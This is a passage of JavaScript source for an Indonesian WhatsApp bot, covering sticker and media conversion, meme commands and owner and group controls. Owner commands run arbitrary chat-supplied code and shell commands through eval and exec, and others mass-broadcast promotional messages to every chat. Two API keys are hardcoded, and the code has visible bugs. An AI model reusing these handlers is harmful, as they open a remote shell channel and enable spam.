             .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
             .toFormat('webp')
             .save(out)       
              } else {
                reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
} 
              break
       case 'gifstiker':
				case 's':
			case 'stickergif':  
				case 'sticker':
				  case 'stiker':
                         if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})
          //  if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
              if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dim
            const media = await dimas.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                dimas.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: freply})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && dim.message.videoMessage.seconds < 11 || isQuotedVideo && dim.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dim
                const media = await dimas.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            dimas.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: freply})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
            }
            break               
       case 'take':
       case 'colong':
                          if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
              if (!isQuotedSticker) return reply('Stiker aja om')
              encmedia = JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media = await dimas.downloadAndSaveMediaMessage(encmedia)
              anu = args.join(' ').split('|')
              satu = anu[0] !== '' ? anu[0] : `${pushname}`
              dua = typeof anu[1] !== 'undefined' ? anu[1] : `UwU`
              require('./lib/fetch.js').createExif(satu, dua)
              require('./lib/fetch.js').modStick(media, dimas, dim, from)
              break
       case 'delwm':
                          if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
              if (!isQuotedSticker) return reply('Stiker aja om')
              encmedia = JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media = await dimas.downloadAndSaveMediaMessage(encmedia)
              anu = args.join(' ').split('|')
              satu = anu[0] !== '' ? anu[0] : ``
              dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
              require('./lib/fetch.js').createExif(satu, dua)
              require('./lib/fetch.js').modStick(media, dimas, dim, from)
              break
       case 'stikerwm':
       case 'stickerwm':
       case 'swm':
       //await reply('Maaf fitur dalam perbaikan..')
                   if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
              var a = arg.split("|")[0];
              var b = arg.split("|")[1];
              if (isMedia && !dim.message.videoMessage || isQuotedImage ) {
              const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
              media = await dimas.downloadAndSaveMediaMessage(encmedia)
              await createExif(a,b)
              out = getRandom('.webp')
              ffmpeg(media)
             .on('error', (e) => {
              console.log(e)
              dimas.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dim })
              fs.unlinkSync(media)
})
             .on('end', () => {
            _out = getRandom('.webp')
              spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
             .on('exit', () => {
              dimas.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dim })
              fs.unlinkSync(out)
              fs.unlinkSync(_out)
              fs.unlinkSync(media)
})
})
             .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
             .toFormat('webp')
             .save(out) 
              } else if ((isMedia && dim.message.videoMessage.seconds < 11 || isQuotedVideo && dim.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
              const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
              const media = await dimas.downloadAndSaveMediaMessage(encmedia)
              pe = args.join('')
              var a = pe.split("|")[0];
              var b = pe.split("|")[1];
              await createExif(a,b)
              out = getRandom('.webp')
              ffmpeg(media)
             .on('error', (e) => {
              console.log(e)
              dimas.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dim })
              fs.unlinkSync(media)
})
             .on('end', () => {
            _out = getRandom('.webp')
              spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
             .on('exit', () => {
              dimas.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dim })
              fs.unlinkSync(out)
              fs.unlinkSync(_out)
              fs.unlinkSync(media)
})
})
             .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
             .toFormat('webp')
             .save(out)       
              } else {
              reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
} 
              break
              case 'nobgkkk':
              //case 'tourl':
               if ((isMedia && !dim.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
               reply(mess.wait)
               boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
               owgi = await dimas.downloadMediaMessage(boij)
               } ran = getRandom('.png')
              exec(`ffmpeg -i ${owgi} ${ran}`, (err) => {
              fs.unlinkSync(owgi)
              if (err) return reply('Gagal, pada saat mengkonversi sticker ke gambar')
              buffer = fs.readFileSync(ran) })
                        bg = await getBuffer(`https://api.lolhuman.xyz/api/removebg?apikey=${lol}&img=${buffer}`)
              //dimas.sendMessage(from, buffer, image, {quoted: dim, caption: 'Nih'})
             // bg = await getBuffer(`https://api.lolhuman.xyz/api/removebg?apikey=${lol}&img=${res}`)
            dimas.sendMessage(from, bg, sticker, {quoted: freply})
             //fs.unlinkSync(ran)

            //sendStickerUrl(from, bg, {quoted:freply})
               break

              case 'sticknobg': case 'snobg': case 'stickernobg':
if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dim
filePath = await dimas.downloadAndSaveMediaMessage(encmedia)
file_name = getRandom('.png')
file_name = getRandom('.webp')
request({
url: `https://api.lolhuman.xyz/api/removebg?apikey=${lol}`,
method: 'POST',
formData: {
"img": fs.createReadStream(filePath)
},
encoding: "binary"
}, function(error, response, body) {
fs.unlinkSync(filePath)
fs.writeFileSync(file_name, body, "binary")
ffmpeg(`./${file_name}`)
.input(file_name)
.on('error', function(err) {
console.log(err)
fs.unlinkSync(file_name)
})
.on('end', function() {
dimas.sendMessage(from, fs.readFileSync(file_name), sticker, { quoted: freply})
fs.unlinkSync(file_name)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(file_name)
});
  } else {
reply(`*Format Error!*\n\n*Example :*\n• *_Kirim gambar dengan Caption ${prefix + command}_*\n\n*NOTE :*\n*_Bisa digunakan dengan Reply gambar_*`)
}
break
              case 'sfire':
{
                
                if (isMedia || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dim
                    let yoooo = await dimas.downloadAndSaveMediaMessage(encmedia)
                    var link = await uptotele(yoooo)
                    var firenya = await getBuffer(`https://api.zeks.xyz/api/burning-image?apikey=${zekskey}&image=${link}`)
                    let media = `./sticker/${sender}.gif`
                    fs.writeFileSync(media, firenya)
                    reply(mess.wait)
                        await ffmpeg(`${media}`)
                            .inputFormat(media.split('.')[4])
                            .on('start', function (cmd) {
                                console.log(`Started : ${cmd}`)
                            })
                            .on('error', function (err) {
                                console.log(err)
                                fs.unlinkSync(media)
                                let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                                reply(mess.error.api)
                            })
                            .on('end', function () {
                                console.log('Finish')
                                    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
                                    dimas.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
                                    limitAdd(sender, limit)
                                    fs.unlinkSync(media)
                                    fs.unlinkSync(`./sticker/${sender}.webp`)
                                })
                            })
                            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                            .toFormat('webp')
                            .save(`./sticker/${sender}.webp`)
                        } else if (isQuotedSticker && !dim.message.stickerMessage === true) {
                    let encmedia = JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    let yoooo = await dimas.downloadAndSaveMediaMessage(encmedia)
                    let ran = getRandom('.png')
                  exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
                        fs.unlinkSync(yoooo)
                        if (err) return reply('Gagal :V')   
                    var link = await uptotele(ran)
                    var firenya = await getBuffer(`https://api.zeks.xyz/api/burning-image?apikey=${zekskey}&image=${link}`)
                    let media = `./sticker/${sender}.gif`
                    fs.writeFileSync(media, firenya)
                    fs.unlinkSync(ran)
                    reply(mess.wait)
                        await ffmpeg(`${media}`)
                            .inputFormat(media.split('.')[4])
                            .on('start', function (cmd) {
                                console.log(`Started : ${cmd}`)
                            })
                            .on('error', function (err) {
                                console.log(`Error : ${err}`)
                                fs.unlinkSync(media)
                                let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                                reply(mess.error.api)
                            })
                            .on('end', function () {
                                console.log('Finish')
                                    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
                                    dimas.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
                                    limitAdd(sender, limit)
                                    fs.unlinkSync(media)
                                    fs.unlinkSync(`./sticker/${sender}.webp`)
                                })
                            })
                            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                            .toFormat('webp')
                            .save(`./sticker/${sender}.webp`)
               })
                 } else {
                   reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
                }
               }
                    break
      case 'toimg':
             if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
              if (!isQuotedSticker) return reply('reply stickernya')
              reply(mess.wait)
              encmedia = JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo
              media = await dimas.downloadAndSaveMediaMessage(encmedia)
              ran = getRandom('.png')
              exec(`ffmpeg -i ${media} ${ran}`, (err) => {
              fs.unlinkSync(media)
              if (err) return reply('Gagal, pada saat mengkonversi sticker ke gambar')
              buffer = fs.readFileSync(ran)
              dimas.sendMessage(from, buffer, image, {quoted: dim, caption: 'Nih'})
              fs.unlinkSync(ran)
})
              break
       case 'smeme': 
                   if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
reply('Loading.... ')
top = arg.split('|')[0]
bottom = arg.split('|')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && !dim.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim 
owgi = await  dimas.downloadAndSaveMediaMessage(ger)
anu = await imgbb("16721ac29279183de385d717c663e681", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
sendStickerUrl(from, `${anu1}`)
} else {
reply('Gunakan foto/stiker!')
}
break

       case 'memeimg':
       case 'memegen': 
       case 'textmaker':
       case 'teksmaker':                   
              top = arg.split('|')[0]
              bottom = arg.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if ((isMedia && !dim.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              reply(mess.wait)
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim 
              owgi = await dimas.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendMediaURL(from, `${anu1}`, mess.success)
              } else {
              reply('Gunakan foto/stiker!')
}
               break
               case 'tovid': case 'tovideo':
//if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
if (!isQuotedSticker) return reply('Reply stiker nya')
//if (dim.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
encmedia = JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await dimas.downloadAndSaveMediaMessage(encmedia)
memek = await webp2gifFile(media)
reply(mess.wait)
console.log(memek)
sendMediaURL(from, memek.result, 'Nih..', {quoted:freply})
//limitAdd(sender, limit)
break
                        
case 'togif':
//if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
if (!isQuotedSticker) return reply('Reply stiker nya')
//if (dimas.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
encmedia = JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await dimas.downloadAndSaveMediaMessage(encmedia)
memek = await webp2gifFile(media)
reply(mess.wait)
console.log(memek)
anu = await getBuffer(memek.result)
dimas.sendMessage(from, anu, video, {mimetype: 'video/gif', caption: 'Nih..', quoted: freply})
//limitAdd(sender, limit)
break
case 'tomp3': case 'getmp3':
//if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
//dim.updatePresence(from, Presence.composing)
if (!isQuotedVideo && !isQuotedAudio) return reply(`Format salah!!\nExample : Reply video dengan caption ${prefix + command}`)
reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await dimas.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(mess.eror)
buffer = fs.readFileSync(ran)
dimas.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: freply})
fs.unlinkSync(ran)
})
//limitAdd(sender, limit)
break
        
//------------------< Ingfo Bot >-------------------
      case 'runtime':
              textImg(`${runtime(process.uptime())}`)
              break
       case 'donate': 
       case 'donasi':
              textImg(setting.txtDonasi)
              break
       case 'sourcecode': 
       case 'sc': 
       case 'src':
              textImg(`Kalo mau scnya chat aja ownernya:v`)
              break
      case 'ping':
      case 'P':
      case 'speed':
              timestampe = speed();
              latensie = speed() - timestampe
              reply(`「 *𝙎𝙋𝙀𝙀𝘿 𝙏𝙀𝙎𝙏* 」\nMerespon dalam ${latensie.toFixed(4)} Sec 💬`)
              break
      case 'botstat':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
teks = `\`\`\`BOT STATISTICS\`\`\`
\`\`\`▢ Group Chats : ${groups.length}\`\`\`
\`\`\`▢ Private Chats : ${privat.length}\`\`\`
\`\`\`▢ Total User : ${_registered.length} user\`\`\`
\`\`\`▢ Total Chats : ${totalChat.length}\`\`\`
\`\`\`▢ Speed : ${latensie.toFixed(4)} _Second_\`\`\`
\`\`\`▢ Active Time : ${kyun(uptime)}\`\`\`

\`\`\`PHONE STATISTICS\`\`\`
\`\`\`▢ Baterai : ${baterai}% ${charger}\`\`\`
\`\`\`▢ Ram Usage : ${ram2}\`\`\`
\`\`\`▢ Platform : ${os.platform()}\`\`\`
\`\`\`▢ Hostname : ${os.hostname()}\`\`\`
\`\`\`▢ Uptime : ${runtime(process.uptime())}\`\`\`
\`\`\`▢ Wa Version: ${dimas.user.phone.wa_version}\`\`\`
\`\`\`▢ Os Version: ${dimas.user.phone.os_version}\`\`\`
\`\`\`▢ Device Manufacturer: ${dimas.user.phone.device_manufacturer}\`\`\`
\`\`\`▢ Device Model: ${dimas.user.phone.device_model}\`\`\`
\`\`\`▢ Os Build Number: ${dimas.user.phone.os_build_number}\`\`\``
             reply(teks)
             break  
//------------------< Owner >-------------------
case 'ban':
                if (!isOwner) return reply('_*Anda siapa??*_')
                bnnd = body.slice(5)
                ban.push(`${bnnd}@s.whatsapp.net`)
                fs.writeFileSync('./database/user/banned.json', JSON.stringify(ban))
                reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
                break
    case 'unban':
                if (!isOwner) return reply('_*Anda siapa*_')
                bnnd = body.slice(7)
                ban.splice(`${bnnd}@s.whatsapp.net`, 1)
                fs.writeFileSync('./database/user/banned.json', JSON.stringify(ban))
                reply(`Nomor wa.me/${bnnd} telah di unban!`)
                break
 case 'blockk':
                dimas.updatePresence(from, Presence.composing) 
                dimas.chatRead (from)
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isOwner) return reply('*Only Admin bot*')
                dimas.blockUser (`${body.slice(8)}@c.us`, "add")
                dimas.sendMessage(from, `*Perintah Diterima, Memblokir* ${body.slice(7)}@c.us`, text)
                break
                
                case 'unblock':
                if (!isGroup) return reply(mess.wait)
                if (!isOwner) return reply(ind.ownerb())
                dimas.blockUser (`${body.slice(9)}@c.us`, "remove")
                dimas.sendMessage(from, `*Perintah Diterima, Membuka Blockir* ${body.slice(9)}@c.us`, text)
                break
      case 'addupdate':
             if (!isOwner) return reply(mess.only.owner)
             if (!q) return reply(`Example: ${command} update fitur`)
           _update.push(q)
             fs.writeFileSync('./database/bot/update.json', JSON.stringify(_update))
             reply(`Update fitur berhasil ditambahkan ke database!`)
             break
      case 'update':
             let updateList = `*── 「 UPDATE BOT 」 ──*\n\n\n`
             for (let i of _update) {
             updateList += `࿃ *${i.replace(_update)}*\n\n`
}
             textImg(updateList)
             break
      case 'reset':
             if (!isOwner) return reply(mess.only.owner)
             var reset = []
             glimit = reset
           _update = reset
             console.log('Hang tight, it\'s time to reset')
             fs.writeFileSync('./database/bot/glimit.json', JSON.stringify(glimit))
             fs.readFileSync('./database/bot/update.json', JSON.stringify(_update))
             textImg('Oke Desu ~')
             break
      case 'exif':
             if (!isOwner) return  reply(mess.only.owner)
             if (!q) return reply(mess.wrongFormat)
             if (!arg.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)
             exif.create(arg.split('|')[0], arg.split('|')[1])
             reply('sukses')
             break	
      case 'join': 
             if (!q) return reply('Linknya?')
             if (!isOwner) return reply(mess.only.owner)
             if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('Linknya Invalid Tod')
             link = args[0].replace('https://chat.whatsapp.com/','')
             fak = dimas.query({ json: ['action', 'invite', link],
             expect200: true })
             reply('Berhasil Masuk Grup')
             break
      case 'eval':
             try {
             if (!isOwner) return
             sy = args.join(' ')
             return eval(sy)
             } catch(e) {
             reply(`${e}`)
}
             break
      case 'getquoted':
                   if (!isOwner) return reply(mess.only.owner)
             reply(JSON.stringify(dim.message.extendedTextMessage.contextInfo, null, 3))
             break
      case 'bc':
      case 'broadcast':
             if (!isOwner) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu = await dimas.chats.all()
             if (isMedia && !dim.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
             bc = await dimas.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             dimas.sendMessage(_.jid, bc, image, {quoted:freply,caption: `*「 MIZUKI BROADCAST 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
             sendMess(_.jid, `*「 MIZUKI BROADCAST 」*\n\n${body.slice(4)}`, {quoted:freply})
}
             reply('Suksess broadcast')
}
             break
             case 'bc2':
      case 'broadcast2':
             if (!isOwner) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu = await dimas.chats.all()
             if (isMedia && !dim.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
             bc = await dimas.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             dimas.sendMessage(_.jid, bc, image, {quoted:freply,caption: `*「 MIZUKI BROADCAST 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
dimas.sendMessage(_.jid, 
   {"contentText": `*「 MIZUKI BROADCAST 」*\n\n${body.slice(4)}`,
   "footerText": 'jika tertarik buat sewa silahkan klik "SEWA BOT:',
   "buttons": [
   {"buttonId": '!sewabot',
   "buttonText": {"displayText": "🛒SEWA BOT"
   },"type": "RESPONSE"}, {"buttonId": '!verify',
   "buttonText": {"displayText": "🔖VERIFIKASI"
   },"type": "RESPONSE"}
   ], "headerType": 1,
   }, MessageType.buttonsMessage )
}
             reply('Suksess broadcast')
}
             break
             case 'bc3': 
             if (!isOwner) return  reply(mess.only.owner) 
             if (args.length < 1) return reply('teks?') 
             anu = await dimas.chats.all() 
             if (isMedia && !dim.message.videoMessage || isQuotedImage) { 
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim 
             bc2 = await dimas.downloadMediaMessage(encmedia) 
             for (let _ of anu) { 
             dimas.sendMessage(_.jid, { contentText: `*🌹 SIARAN MIZUKI BOTZ 🌹*\n\n${body.slice(4)}`, footerText: '©Created by Alwi OFC', buttons: [{ buttonId: `${prefix}menu`, buttonText: { displayText: 'MENU' }, type: 1 }, { buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 }], headerType: 6, locationMessage: { degreesLatitude: 0, degreesLongitude: 0, jpegThumbnail: bc2 }}, 'buttonsMessage') 
} 
             reply('Suksess broadcast') 
} 
             break
                case 'bc4':
      case 'broadcast4':
             if (!isOwner) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu = await dimas.chats.all()
             if (isMedia && !dim.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
             bc = await dimas.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             dimas.sendMessage(_.jid, bc, image, {quoted:freply,caption: `*「 MIZUKI BROADCAST 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
dimas.sendMessage(_.jid, 
   {"contentText": `*「 MIZUKI BROADCAST 」*\n\n${body.slice(4)}`,
   "footerText": 'Yok join kakak..',
   "buttons": [
   {"buttonId": '!izumigroup',
   "buttonText": {"displayText": "Join Group"
   },"type": "RESPONSE"}
   ], "headerType": 1,
   }, MessageType.buttonsMessage )
}
             reply('Suksess broadcast')
}
             break
             case 'bc3': 
             if (!isOwner) return  reply(mess.only.owner) 
             if (args.length < 1) return reply('teks?') 
             anu = await dimas.chats.all() 
             if (isMedia && !dim.message.videoMessage || isQuotedImage) { 
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim 
             bc2 = await dimas.downloadMediaMessage(encmedia) 
             for (let _ of anu) { 
             dimas.sendMessage(_.jid, { contentText: `*🌹 SIARAN MIZUKI BOTZ 🌹*\n\n${body.slice(4)}`, footerText: '©Created by Alwi OFC', buttons: [{ buttonId: `${prefix}menu`, buttonText: { displayText: 'MENU' }, type: 1 }, { buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 }], headerType: 6, locationMessage: { degreesLatitude: 0, degreesLongitude: 0, jpegThumbnail: bc2 }}, 'buttonsMessage') 
} 
             reply('Suksess broadcast') 
} 
             break
      case 'clearall':
             if (!isOwner) return  reply(mess.only.owner)
             anu = await dimas.chats.all()
             dimas.setMaxListeners(25)
             for (let _ of anu) {
             dimas.deleteChat(_.jid)
}
             reply('Sukses delete all chat :)')
             break
      case 'term':
             if (!isOwner) return
             if (!q) return
             exec(q, (err, stdout) => {
             if (err) return reply(`${err}`)
             if (stdout) {
             reply(stdout)
}
})
             break 
      case 'shutdown':
             if (!isOwner) return 
             reply(`Bye...`)
             await sleep(3000)
             process.exit()
             break
      case 'restart':
             if (!isOwner) return 
             reply(mess.wait)
             exec(`node main`)
             reply('_Restarting Bot Success_')
             break
      case 'leaveall':
             if (!isOwner) return  reply(mess.only.owner)
             let totalgroup = dimas.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
             for (let id of totalgroup) {
             sendMess(id, 'Byee', null)
             await sleep(3000)
             dimas.groupLeave(id)
}
             break
//------------------< G R U P >-------------------
      case 'kick':
             if (!isBotGroupAdmins) return reply(mess.only.Badmin)
          if (!isGroupAdmins) return reply(mess.only.admin)
                             if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

             kick(from, mentionUser)
             break
      case 'add':
             if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                          if (!isGroupAdmins) return reply(mess.only.admin)
                             if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

             if (dim.message.extendedTextMessage === null || dim.message.extendedTextMessage === undefined) {
             entah = arg.split("|")[0]
             entah = entah.replace(new RegExp("[()+-/ +/]", "gi"), "")
             entah = `${entah}@s.whatsapp.net`
             dimas.groupAdd(from, [entah])
             } else {
             entah = dim.message.extendedTextMessage.contextInfo.participant
             dimas.groupAdd(from, [entah])
}
             break
            /* case 'pm': case 'promote':
                       if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !dim.key.fromMe && !isOwner) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (dim.message.extendedTextMessage === undefined || dim.message.extendedTextMessage === null) return
mentioned = dim.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Berhasil Promote @${mentioned[0].split('@')[0]} Sebagai Admin Group!`, mentioned, true)
dimas.groupMakeAdmin(from, mentioned)
break
                    
case 'dm': case 'demote':
          if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !itsMe && !isOwner) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
